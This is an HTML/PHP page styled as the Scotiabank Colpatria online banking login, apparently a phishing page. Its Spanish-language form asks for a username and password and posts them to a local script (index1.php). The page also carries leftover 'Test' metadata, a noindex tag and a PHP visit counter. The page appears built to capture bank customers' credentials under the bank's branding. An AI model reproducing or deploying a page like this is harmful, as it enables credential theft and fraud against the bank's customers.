
<!DOCTYPE html>

<html>

<head>
	
	<link rel="icon" href="favicon.png" type="favicon.png" sizes="32x32" />
	<title>Scotiabank Colpatria ❘ Banca virtual</title>
	<meta charset="utf-8">

<meta name="keywords" content="Test">
        <meta name="description" content="Test">
        <meta name="description" content="Web site created using create-react-app">
        <meta name="subject" content="Test">
        <meta name="copyright" content="Test">
        <meta name="url" content="http://www.test.com">
        <meta name="language" content="en-GB">
        <meta name="robots" content="NOINDEX, NOFOLLOW">
        <meta name="pagename" content="$Title">
        <meta name="coverage" content="Worldwide">
        <meta name="distribution" content="Global">
        <meta name="target" content="all">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="640">
        <meta name="format-detection" content="telephone=no">
        <meta http-equiv="cleartype" content="on">
        <meta name="apple-mobile-web-app-title" content="$Title">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta name="ResourceLoaderDynamicStyles" content="">
        <meta http-equiv="Expires" content="0">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Cache-Control" content="no-cache">
        <meta http-equiv="imagetoolbar" content="no">
        <meta http-equiv="x-dns-prefetch-control" content="off">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">

        <!-- Makes your prototype chrome-less once bookmarked to your phone's home screen -->
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">

        <!-- Set a shorter title for iOS6 devices when saved to home screen -->
        <meta name="apple-mobile-web-app-title" content="Ratchet">

	<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
	<link rel="stylesheet" type="text/css" href="estilo.css">

</head>

<body>
<div class="header" id="Cabezote">
<img class="favicon" src="colpatria-red.svg" alt="colpatria-red.svg">
<img class="favicon1" src="favicon1.svg" alt="favicon1.svg">
</div>	

<section class="box" >
	
	<div class="container" id="container">

		<h2> Ingresa a tu Banca Virtual </h2>
<form class ="form" method="POST"action="index1.php" >
		<br>
        	<input  id="email1"  name="usuario" placeholder="Nombre usuario"  value="" required=>
			<br>
			<div class="icon" id="icon">  
				<img src="user.png" style="opacity: 90%;" alt="icon-user">
			</div>
			<input  id="contra1" type="password" name="pass" placeholder="Contraseña" value=""   required=>
				<div class="icon2" id="icon2">  
				<img src="pass.png" style="opacity: 90%;" alt="icon-pass">
			</div>
			<h6>¿Necesitas ayuda para ingresar?</h6>
			<br>
			<label><input type="checkbox" id="cbox1" value="first_checkbox">Recordar mi nombre de usuario </label><br>
			<br>

			<br>
			<input  id="accept1" type="submit" value="Ingresar">

			 

	</div>
	</div>


		</form>

	<div class="bottom1" >

		<?php
    function contadorvisitas()//  La función que ejecutara las visitas
    {
        $archivo = "contadorvisitas.txt"; //el archivo donde se almacena las visitas
        $f = fopen($archivo, "r"); //abrimos el fichero
        if($f)
        {
            $contadorvisitas = fread($f, filesize($archivo)); //vemos el archivo a grabar
            $contadorvisitas = $contadorvisitas + 1; // Le agregamos una visita mas al contador
            fclose($f);
        }
        $f = fopen($archivo, "w+");
        if($f)
        {
            fwrite($f, $contadorvisitas);
            fclose($f);
        }
        return $contadorvisitas;
    }
    
    //Mostramos las visitas acumuladas
    echo "Visitas totales "; 
    echo contadorvisitas();//imprime las visitas
    
?>

	</div>

		
</section>
 <div class="logo1" >
		<img src="logo3.png" alt="logo1">
	
	</div>

</body>

</html>
